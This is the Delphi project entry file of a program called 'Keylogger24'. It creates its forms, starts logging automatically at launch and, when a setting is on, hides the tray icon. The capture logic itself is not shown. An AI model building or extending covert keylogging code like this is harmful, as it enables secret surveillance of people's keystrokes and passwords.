program Keylogger24;

uses
  Forms,
  Windows,
  SysUtils,
  ShellApi,
  frmMain in 'frmMain.pas' {Form1},
  Unit2 in 'Unit2.pas' {Form_Settings},
  Unit3 in 'Unit3.pas' {Form_About},
  Unit4 in 'Unit4.pas' {Form_pwd};

{$R *.res}
var
  HApp : HWND;

procedure RunProcD;
begin
  Form1.LoadSettings;
  Form1.Button_start.Click;
  Form1.spSkinSpeedButton_Start.Down:=True;
  if Form_Settings.spSkinCheckRadioBox_Hide.Checked then Form1.spTrayIcon1.IconVisible := False;
  if Form1.FirstAppRun then Form1.spTrayIcon1DblClick(nil);
end;

//-----------------------------------------------------------------------------------------

begin
 //
 Application.Title:=APP_NAME;
 HApp:=FindWindow(nil, PChar(APP_NAME + ' ' + APP_VERSION));
 //
 if (HApp = 0) then
 begin
  Application.Initialize;
  Application.CreateForm(TForm1, Form1);
  Application.CreateForm(TForm_pwd, Form_pwd);
  Application.CreateForm(TForm_About, Form_About);
  Application.CreateForm(TForm_Settings, Form_Settings);
  RunProcD;
  Application.Run;
 end;
end.
